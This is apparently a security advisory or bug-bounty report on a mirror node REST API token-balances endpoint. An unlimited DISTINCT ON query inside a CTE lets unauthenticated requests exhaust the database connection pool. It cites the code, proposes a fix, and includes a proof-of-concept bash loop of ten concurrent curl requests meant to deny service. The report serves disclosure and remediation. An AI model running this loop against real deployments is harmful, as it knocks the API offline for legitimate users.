### Title
Unbounded `DISTINCT ON` CTE Materialization in `extractSqlFromTokenBalancesRequest` Enables Unauthenticated DoS via DB Resource Exhaustion

### Summary
When `GET /api/v1/tokens/{tokenId}/balances` is called with both a `timestamp` filter and an `account.balance` filter simultaneously, `extractSqlFromTokenBalancesRequest` wraps an unlimited `DISTINCT ON` query inside a CTE. The `LIMIT` clause is appended only to the outer query, forcing PostgreSQL to fully materialize all distinct account rows for the token within the timestamp range before filtering. An unauthenticated attacker can exploit this to exhaust the DB connection pool (default: 10 connections, 20-second timeout each) and deny service to all other API consumers.

### Finding Description

**Exact code path:** `rest/tokens.js`, `extractSqlFromTokenBalancesRequest()`, lines 638–666.

When `tsConditions.length > 0` (triggered by any `timestamp=` query param), the function builds a `DISTINCT ON` query at lines 649–657:

```js
query = `select
    distinct on (ti.account_id)
    ti.account_id,
    ti.balance,
    $${params.length}::bigint as snapshot_timestamp
  from token_balance as ti
  ${joinEntityClause}
  where ${conditions.join(' and ')}
  order by ti.account_id ${order}, ti.consensus_timestamp desc`;
``` [1](#0-0) 

When `balanceConditions.length > 0` (triggered by any `account.balance=` query param), lines 658–665 wrap that query in a CTE:

```js
if (balanceConditions.length) {
  query = `with ti as (${query})
  select *
  from ti
  where ${balanceConditions.join(' and ')}
  order by account_id ${order}`;
}
``` [2](#0-1) 

The `LIMIT` is then appended at line 666 — **to the outer query only**, never to the inner `DISTINCT ON`:

```js
query += `\nlimit $${params.push(limit)}`;
``` [3](#0-2) 

**Root cause:** The inner `DISTINCT ON` subquery has no `LIMIT`. PostgreSQL must scan and sort every `token_balance` row for the given `token_id` within the timestamp range, deduplicate by `account_id`, and materialize the full result before the outer `WHERE ti.balance >= $N` and `LIMIT` can be applied. For a widely-held token this can be millions of rows.

**Timestamp range bounding:** `getAccountBalanceTimestampRange` (in `rest/balances.js`, lines 167–197) bounds the range to at most one calendar month, but a popular token can still have millions of balance records within a single month. [4](#0-3) 

**No authentication required:** `getTokenBalances` calls `utils.buildAndValidateFilters` with no auth check; `authHandler` only sets a custom response-row limit for known users and does not block unauthenticated requests. [5](#0-4) [6](#0-5) 

**DB pool constraints:** Default configuration exposes `maxConnections = 10` and `statementTimeout = 20000` ms. [7](#0-6) 

### Impact Explanation

An attacker sending ~10 concurrent requests of the form `GET /api/v1/tokens/{popularTokenId}/balances?timestamp=lte:X&account.balance=gte:0` will hold all 10 DB connections for up to 20 seconds each. During this window every other REST API request that requires a DB connection will queue or fail, effectively taking down the mirror node REST API. Because the `token_balance` table is partitioned by month and a popular token (e.g., a stablecoin with millions of holders) can have tens of millions of rows per partition, each query can consume gigabytes of PostgreSQL working memory (`work_mem`) for the sort/dedup step, potentially causing OOM conditions on the DB host. This maps directly to the stated severity: shutdown of ≥30% of network processing nodes without brute force.

### Likelihood Explanation

The endpoint is public, requires zero authentication, and accepts standard documented query parameters. The exploit is a single HTTP GET request reproducible by any internet user. The attacker needs only to know a token ID with a large holder set (trivially discoverable from the public ledger). The attack is repeatable at will and requires no special tooling beyond `curl` or a browser.

### Recommendation

Move the `LIMIT` inside the `DISTINCT ON` query when no balance filter is present, and when a balance filter is present, apply an intermediate cap (e.g., `LIMIT maxScanRows`) inside the CTE to bound materialization:

```js
// Inside the CTE, always add a scan cap
const scanLimit = balanceConditions.length ? config.response.limit.max * SCAN_MULTIPLIER : limit;
query = `select distinct on (ti.account_id) ...
  order by ti.account_id ${order}, ti.consensus_timestamp desc
  limit ${scanLimit}`;   // <-- bound the inner scan
if (balanceConditions.length) {
  query = `with ti as (${query})
    select * from ti
    where ${balanceConditions.join(' and ')}
    order by account_id ${order}
    limit $${params.push(limit)}`;
} else {
  query += `\nlimit $${params.push(limit)}`;
}
```

Additionally, add per-IP rate limiting (e.g., via Traefik middleware, as already done for the Rosetta API) to the REST API ingress. [8](#0-7) 

### Proof of Concept

**Preconditions:** A token with a large number of holders (e.g., `0.0.1234567`) exists on the network. The mirror node REST API is publicly accessible.

**Step 1 – Single trigger (verify query shape):**
```
GET /api/v1/tokens/0.0.1234567/balances?timestamp=lte:1700000000.000000000&account.balance=gte:0
```
This causes the DB to execute:
```sql
with ti as (
  select distinct on (ti.account_id)
    ti.account_id, ti.balance, $3::bigint as snapshot_timestamp
  from token_balance as ti
  where ti.token_id = $1
    and ti.consensus_timestamp >= $2
    and ti.consensus_timestamp <= $3
  order by ti.account_id desc, ti.consensus_timestamp desc
  -- NO LIMIT
)
select * from ti
where ti.balance >= $4
order by account_id desc
limit $5
```

**Step 2 – DoS (exhaust connection pool):**
```bash
for i in $(seq 1 10); do
  curl -s "https://<mirror-node>/api/v1/tokens/0.0.1234567/balances?timestamp=lte:1700000000.000000000&account.balance=gte:0" &
done
wait
```

**Result:** All 10 DB connections are held for up to 20 seconds. Concurrent legitimate API requests receive connection timeout errors or hang until the pool drains.

### Citations

**File:** rest/tokens.js (L649-657)
```javascript
    query = `select
        distinct on (ti.account_id)
        ti.account_id,
        ti.balance,
        $${params.length}::bigint as snapshot_timestamp
      from token_balance as ti
      ${joinEntityClause}
      where ${conditions.join(' and ')}
      order by ti.account_id ${order}, ti.consensus_timestamp desc`;
```

**File:** rest/tokens.js (L658-665)
```javascript
    if (balanceConditions.length) {
      // Apply balance filter after retrieving the latest balance as of the upper timestamp
      query = `with ti as (${query})
      select *
      from ti
      where ${balanceConditions.join(' and ')}
      order by account_id ${order}`;
    }
```

**File:** rest/tokens.js (L666-666)
```javascript
    query += `\nlimit $${params.push(limit)}`;
```

**File:** rest/tokens.js (L706-709)
```javascript
const getTokenBalances = async (req, res) => {
  const tokenId = getAndValidateTokenIdRequestPathParam(req);
  const filters = utils.buildAndValidateFilters(req.query, acceptedTokenBalancesParameters);

```

**File:** rest/balances.js (L167-197)
```javascript
const getAccountBalanceTimestampRange = async (tsQuery, tsParams) => {
  const {lowerBound, upperBound, neParams} = getOptimizedTimestampRange(tsQuery, tsParams);
  if (lowerBound === undefined) {
    return {};
  }

  // Add the treasury account to the query as it will always be in the balance snapshot and account_id is the first
  // column of the primary key
  let condition = 'account_id = $1 and consensus_timestamp >= $2 and consensus_timestamp <= $3';
  const params = [EntityId.systemEntity.treasuryAccount.getEncodedId(), lowerBound, upperBound];
  if (neParams.length) {
    condition += ' and not consensus_timestamp = any ($4)';
    params.push(neParams);
  }

  const query = `
    select consensus_timestamp
    from account_balance
    where ${condition}
    order by consensus_timestamp desc
    limit 1`;

  const {rows} = await pool.queryQuietly(query, params);
  if (rows.length === 0) {
    return {};
  }

  const upper = rows[0].consensus_timestamp;
  const lower = utils.getFirstDayOfMonth(upper);
  return {lower, upper};
};
```

**File:** rest/middleware/authHandler.js (L15-36)
```javascript
const authHandler = async (req, res) => {
  const credentials = basicAuth(req);

  if (!credentials) {
    return;
  }

  const user = findUser(credentials.name, credentials.pass);
  if (!user) {
    res.status(httpStatusCodes.UNAUTHORIZED.code).json({
      _status: {
        messages: [{message: 'Invalid credentials'}],
      },
    });
    return;
  }

  if (user.limit !== undefined && user.limit > 0) {
    httpContext.set(userLimitLabel, user.limit);
    logger.debug(`Authenticated user ${user.username} with custom limit ${user.limit}`);
  }
};
```

**File:** docs/configuration.md (L556-557)
```markdown
| `hiero.mirror.rest.db.pool.maxConnections`                               | 10                      | The maximum number of clients the database pool can contain                                                                                                                                   |
| `hiero.mirror.rest.db.pool.statementTimeout`                             | 20000                   | The number of milliseconds to wait before timing out a query statement                                                                                                                        |
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L157-161)
```yaml
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
  - retry:
```
